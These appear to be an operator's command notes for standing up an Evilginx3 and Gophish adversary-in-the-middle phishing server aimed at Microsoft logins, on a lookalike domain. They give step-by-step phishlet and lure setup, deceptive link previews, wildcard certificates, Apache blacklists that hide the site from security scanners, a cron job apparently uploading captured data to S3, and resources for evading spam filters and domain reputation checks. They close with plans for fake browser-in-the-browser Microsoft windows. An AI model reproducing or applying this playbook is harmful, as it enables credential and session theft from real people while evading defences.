

# Notes & Useful CMDs


##### Set DMARC and SPF

DMARC POLICY (note the p=reject):
v=DMARC1; p=reject; rua=mailto:info@etech-it.com; ruf=mailto:info@etech-it.com; fo=1; adkim=r; aspf=r; pct=100

SPF already comes in from Namecheap


##### SSH to EC2:
ssh -i "etech-hack-instance.pem" ubuntu@ec2-13-49-224-4.eu-north-1.compute.amazonaws.com


##### INSTALL APACHE2
sudo apt install apache2 -y
sudo systemctl start apache2
sudo systemctl enable apache2


##### APACHE CONFIG
/etc/apache2/sites-enabled/000-default.conf
(Also add redirect rules aka blacklists - see redirect.rules file )
sudo systemctl restart apache2

##### APACHE LOGS
/var/log/apache2/


##### CREATE TMUX SESSION:
tmux new-session -s evilginx
tmux new-session -s gophish

CTRL + B then D to detach and keep alive

##### Workflow in Evilginx:
tmux attach-session -t evilginx
tmux attach-session -t gophish


MAKE SURE WITH EVIGOPHISH EVILGINX IS LISTENING TO 8443 NOT 443. Can set this in build as default (search for 443 in config.go) OR after setup go to /root/.data/config.json

In evilginx tmux session
cd evilgophish/evilginx3
./evilginx3 -p phishlets

turn off evilginx blacklists (we use apache2):
blacklists off

config ipv4 xx.xx.xx.xx
config domain etech-it.com

TRY WITHOUT: blacklist unauth

(Might need to bind locally if you have issues with Apache2):
config ipv4 bind 127.0.0.1

phishlets hostname new etech-it.com

phishlets enable new

lures create new

lures edit 0 redirector download_example

lures get-url 0

###### Customization: 
lures edit 0 og_title "Etech IT - Cybersecurity Solutions"

lures edit 0 og_image "https://login.etech-it.com/landing/images/favicon.ico"

lures edit 0 og_desc "Your trusted partner in cybersecurity training"

lures edit 0 og_url "https://etech-it.com"

lures edit 0 path "training/1-1"

lures edit 0 redirector base_redirector

lures pause 0 5m

lures unpause 0

lures edit 0 redirect_url ‘’

config unauth_url https://etech-it.com/

phishlets edit new unauth_url https://etech-it.com/


##### Testing for APACHE2 blacklists:
curl -H "X-Forwarded-For: [IP_TO_TEST]" http://yourdomain.com/path
curl -A "User-Agent-To-Test" http://yourdomain.com/path




##### EVILGOPHISH SETUP (use the modified version in this repo):

PUT Phishlets to use under evilgophish-main/evilginx3/phishlets

COPY EVILGINX3 custom mod to evilgophish setup

NOTE: the subdomains provided during config and set for DNS must match with the subdomains in the phishlet under proxy_hosts.

sudo su
Not working (issue with subdomains list)
./setup.sh etech-it.com “login account” false https://myapplications.microsoft.com/ true user_id true

working (single subdomain)
./setup.sh etech-it.com login false https://myapplications.microsoft.com/ true user_id true

./setup.sh etech-it.com login,account false https://myapplications.microsoft.com/ false user_id false



##### CERTS
FROM ANOTHER TERMINAL:

sudo su

NOT WORKING:
letsencrypt|certbot certonly --manual --preferred-challenges=dns --email info@etech-it.com --server https://acme-v02.api.letsencrypt.org/directory --agree-tos -d '*.etech-it.com' -d 'etech-it.com'


WORKING:
certbot certonly --manual --preferred-challenges=dns --email info@etech-it.com --server https://acme-v02.api.letsencrypt.org/directory --agree-tos -d '*.etech-it.com' -d 'etech-it.com'

SETUP 2 TXT records for the challenge

Successfully received certificate.
Certificate is saved at: /etc/letsencrypt/live/etech-it.com/fullchain.pem
Key is saved at:         /etc/letsencrypt/live/etech-it.com/privkey.pem
This certificate expires on 2023-12-27.
These files will be updated when the certificate renews.

provide eviglophish setup with path:
/etc/letsencrypt/live/etech-it.com/

wait a bit


[evilgophish setup] [+] Configured gophish!
[evilgophish setup] [+] Configured evilginx3!
[evilgophish setup] [+] Installation complete! When ready start apache with: systemctl restart apache2
[evilgophish setup] [*] It is recommended to run all servers inside a tmux session to avoid losing them over SSH!



##### ONLY IF USING EVILGINX SOLO -> 

Building on a MacBook for Linux:
GOOS=linux GOARCH=amd64 go build -o ./build/evilginx-linux


COPY EVILGINX BUILD
scp -i "etech-hack-instance.pem" ./evilginx3/build/evilginx ubuntu@ec2-13-49-224-4.eu-north-1.compute.amazonaws.com:~/evilginx


COPY PHISHLETS
scp -i "etech-hack-instance.pem" -r ./phishlets  ubuntu@ec2-13-49-224-4.eu-north-1.compute.amazonaws.com:~/phishlets





##### Troubleshooting:

Port 443 already used:
sudo netstat -ntupl | grep :443
kill -9 PID_FROM_ABOVE



##### S3 Bucket Uploader - Cron Job

Add cronjob to sudo user crontab.

sudo su
crontab -e


Add this line
* * * * * /usr/bin/python3 /home/ubuntu/EvilGinx2_S3.py

The reload the crontab with the following:
service cron reload


# Useful Links:
Phishing Presentation Links


Expired Domains:
https://www.expireddomains.net/expired-domains/

Namecheap Marketplace:
https://www.namecheap.com/market/

Email Spam Check:
mailgenius.com


Domain categorisation McAfee:
https://sitelookup.mcafee.com/en/feedback/url



BITB Empty:
https://dynamic-gaufre-b692f2.netlify.app

MSFT IP Addresses
https://www.microsoft.com/en-US/download/details.aspx?id=53602


Spam trigger words list:
https://blog.hubspot.com/blog/tabid/6307/bid/30684/the-ultimate-list-of-email-spam-trigger-words.aspx

Email spam test:
https://app.mailgenius.com/

Blacklist checks:
https://mxtoolbox.com/SuperTool.aspx

Analyze email headers:
https://mxtoolbox.com/EmailHeaders.aspx


Sophos analysis
https://intelix.sophos.com/


Nice on evilginx and evading detection
https://www.sprocketsecurity.com/resources/never-had-a-bad-day-phishing-how-to-set-up-gophish-to-evade-security-controls





# Extra Ideas:

Once dragged out of window, close and open real Microsoft window with same width
Also add spinner at beginning to seem realistic?

Remove on click outside
Make website unclickable while BITB open

Rewrite rule to spoof x forwarded for header when sending email and when returning web responses? Mimic MS?